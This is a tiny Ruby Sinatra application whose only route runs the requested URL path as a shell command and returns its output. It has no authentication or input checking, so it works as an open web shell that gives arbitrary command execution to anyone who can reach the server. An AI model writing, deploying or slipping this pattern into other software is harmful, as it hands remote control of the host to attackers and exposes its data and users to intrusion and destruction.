require 'rubygems'
require 'sinatra'
require 'sinatra/reloader'

enable :run
set :public, File.dirname(__FILE__) + '/public'

get '/:command' do
  begin
    `#{params[:command]} 2>&1`
  rescue Exception => err
    err.message
  end
end